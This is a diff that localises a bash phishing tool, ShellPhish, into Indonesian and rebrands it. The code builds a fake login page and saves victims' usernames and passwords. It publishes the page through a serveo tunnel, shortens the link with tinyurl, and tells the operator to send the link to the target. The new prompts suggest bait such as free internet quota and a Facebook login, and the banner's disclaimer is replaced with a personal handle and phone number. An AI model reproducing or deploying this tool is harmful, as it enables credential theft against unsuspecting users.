@@ -144,10 +144,10 @@ printf "\e[1;77m |  _  ||   | \  / _  )| || ||  ____/ | || \ | | /___)| || \  \e
 printf "\e[1;77m | | | || |   | (/ / | || || |      | | | || ||___ || | | | \e[0m\n"
 printf "\e[1;77m |_| |_|| |   | \____)|_||_||_|      |_| |_||_|(___/ |_| |_| v1.7\e[0m\n"
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by:  @linux_choice \e[0m\e[1;93m.:.:.\e[0m\n"
+printf "\e[1;93m       .:.:.\e[0m\e[1;77m HACK ALL Tool coded by:  Namaku_Namamu \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
-printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
-printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by ShellPhish ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: Follow IG/WA : @style7g / 081230333715  ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: WARNING!!! Jangan Digunakan untuk tindakan negatif! ::\e[0m\n"
 printf "\n"
 }
 
@@ -158,19 +158,19 @@ default_user_text="Username:"
 default_pass_text="Password:"
 default_sub_text="Log-In"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 ( Contoh : Kuota internet GERATIS!! ): \e[0m' cap1
 cap1="${cap1:-${default_cap1}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 ( Contoh : log-in Facebook ): \e[0m' cap2
 cap2="${cap2:-${default_cap2}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field ( Contoh : Masukan Username ): \e[0m' user_text
 user_text="${user_text:-${default_user_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field ( Contoh : Masukan password ): \e[0m' pass_text
 pass_text="${pass_text:-${default_pass_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field ( Contoh : Log-in ): \e[0m' sub_text
 sub_text="${sub_text:-${default_sub_text}}"
 
 echo "<!DOCTYPE html>" > sites/create/login.html
@@ -205,7 +205,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Menunggu Target Masuk ke Dalam Jebakan, Klik Ctrl + C untuk Selesai...\e[0m\n"
 
 }
 
@@ -309,9 +309,9 @@ printf "\n"
 sleep 10
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Salin dan Kirim Link ke Target!! :\e[0m\e[1;77m %s \n' $send_link
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Atau gunakan Link ini.. :\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
 checkfound
 
